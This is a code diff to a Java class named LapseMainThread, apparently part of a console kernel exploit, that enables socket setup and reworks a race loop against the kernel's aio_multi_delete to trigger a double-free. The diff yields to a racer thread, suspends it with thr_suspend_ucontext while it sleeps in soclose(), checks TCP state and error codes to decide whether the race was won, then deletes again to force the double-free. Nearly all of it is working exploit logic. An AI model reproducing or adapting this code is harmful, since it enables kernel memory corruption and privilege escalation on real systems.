@@ -157,17 +157,17 @@ public class LapseMainThread extends Thread {
 
 		k.aioMultiCancelAutoBatch(groomIds, null);
 
-		// console.add("Lapse: setup inet socket to wait for soclose");
+		console.add("Lapse: setup inet socket to wait for soclose");
 
-		// // Pick a random port in case it's a bad idea if it gets accidentally reused
-		// Random random = new Random();
-		// int port = 10000 + (random.nextInt() % 20000);
-		// serverAddress = k.new SocketAddress(LibKernel.AF_INET, port, 127, 0, 0, 1);
+		// Pick a random port in case it's a bad idea if it gets accidentally reused
+		Random random = new Random();
+		int port = 10000 + (Math.abs(random.nextInt()) % 10000);
+		serverAddress = k.new SocketAddress(LibKernel.AF_INET, port, 127, 0, 0, 1);
 
-		// serverSocket = k.new Socket(LibKernel.AF_INET, LibKernel.SOCK_STREAM);
-		// serverSocket.setReuseAddr(true);
-		// serverSocket.bind(serverAddress);
-		// serverSocket.listen(1);
+		serverSocket = k.new Socket(LibKernel.AF_INET, LibKernel.SOCK_STREAM);
+		serverSocket.setReuseAddr(true);
+		serverSocket.bind(serverAddress);
+		serverSocket.listen(1);
 
 		console.add("Lapse: allocate aio requests array");
 
@@ -178,17 +178,18 @@ public class LapseMainThread extends Thread {
 	Socket client = null;
 	Socket connection = null;
 
+	long raceThreadToResume = 0;
+
 	private boolean loop(int attempt) {
 		console.add("Lapse: attempt " + attempt + " of " + NUM_RACES);
 
-		// // Some sockets nonsense that I don't understand yet
-		// // Wait, is this just required because Lua doesn't support threads?
-		// client = k.new Socket(LibKernel.AF_INET, LibKernel.SOCK_STREAM);
-		// client.connect(serverAddress);
-		// connection = serverSocket.accept();
+		// Some sockets nonsense that I don't understand yet
+		client = k.new Socket(LibKernel.AF_INET, LibKernel.SOCK_STREAM);
+		client.connect(serverAddress);
+		connection = serverSocket.accept();
 
-		// // Force soclose() to sleep
-		// connection.setLinger(true, 1);
+		// Force soclose() to sleep (not sure where soclose is called from; aio_multi_delete?)
+		connection.setLinger(true, 1);
 
 		// Set up the request that the main and race thread will be racing over
 		int whichRequest = NUM_RACE_REQS - 1;
@@ -227,28 +228,66 @@ public class LapseMainThread extends Thread {
 		console.add("Lapse: starting race to delete aio submit " + raceSubmitIds.get(0).id.get());
 
 		// Resume worker thread
-		racerPipe[1].write(new Buffer(1));
+		// racerPipe[1].write(new Buffer(1));
+		// console.add("Lapse: wrote one byte to fd " + racerPipe[1].fd);
 
-		// Delete (hopefully double-free!)
-		k.aioMultiDelete(submitIdsToDelete, mainThreadErrors);
+		// Pipes appear to be cursed. Let's see if a spinlock fares any better.
+		racerTidBuf.putLong(0, 0);
 
-		// Wait for the worker thread to finish as well
-		if (!k.waitUntilNotEqualLong(racerDoneBuf, 0, 0, 1, 2000)) {
-			throw new RuntimeException("Timed out waiting on racerDoneBuf");
+		// Yield and hope the racer runs next, if it does it should sleep in soclose()
+		// Presumably aio_multi_delete calls soclose because that request has a socket attached?
+		console.add("Lapse: yielding to racer");
+		k.yield();
+
+		console.add("Lapse: control yielded back to main thread");
+
+		// If the racer has in fact run until soclose() and then yielded control back to us, then we
+		// can delay its execution of soclose() indefinitely
+		k.SYS_thr_suspend_ucontext.call(racerTid);
+		raceThreadToResume = racerTid;
+		console.add("Lapse: racer suspended via thr_suspend_ucontext");
+
+		// Not sure what this poll is for specifically
+		k.aioMultiPoll(raceSubmitIds, null);
+		console.add("Lapse: aio_multi_poll returned");
+
+		// If TCP state is TCPS_ESTABLISHED then we lost
+		int tcpState = connection.getTCPState();
+		if (tcpState == LibKernel.TCPS_ESTABLISHED) {
+			console.add("Lapse: lost race: TCP state is " + tcpState);
+			return false;
 		}
+		console.add("Lapse: TCP state is " + tcpState);
 
+		// If racer thread aio_multi_delete returned SCE_KERNEL_ERROR_ESRCH then we lost
+		int raceError = raceThreadErrors.get(0).id.get();
+		if (raceError == LibKernel.SCE_KERNEL_ERROR_ESRCH) {
+			console.add("Lapse: lost race: race-thread aio_multi_delete error 0x" + Integer.toHexString(raceError));
+			return false;
+		}
+		console.add("Lapse: race-thread aio_multi_delete error is 0x" + Integer.toHexString(raceError));
+
+		// If we made it this far then we might have won? Try to double-free
+		console.add("Lapse: attempting aio_multi_delete for double-free");
+		k.aioMultiDelete(submitIdsToDelete, mainThreadErrors);
 		int mainError = mainThreadErrors.get(0).id.get();
-		int raceError = mainThreadErrors.get(0).id.get();
+
+		// abc's PoC says mainError and raceError should match if we've achieved the double-free
 		console.add("Lapse: main/race errors: 0x" + Integer.toHexString(mainError) + " 0x" + Integer.toHexString(raceError));
 		if (mainError == raceError) {
 			console.add("Lapse: double free achieved!");
 			return true;
 		}
 
-		return false; // did not win the race
+		console.add("Lapse: double free not achieved?");
+		return false;
 	}
 
 	private void cleanAfterLoop() {
+		if (raceThreadToResume != 0) {
+			k.SYS_thr_resume_ucontext.call(raceThreadToResume);
+			raceThreadToResume = 0;
+		}
 		if (client != null) {
 			client.close();
 		}
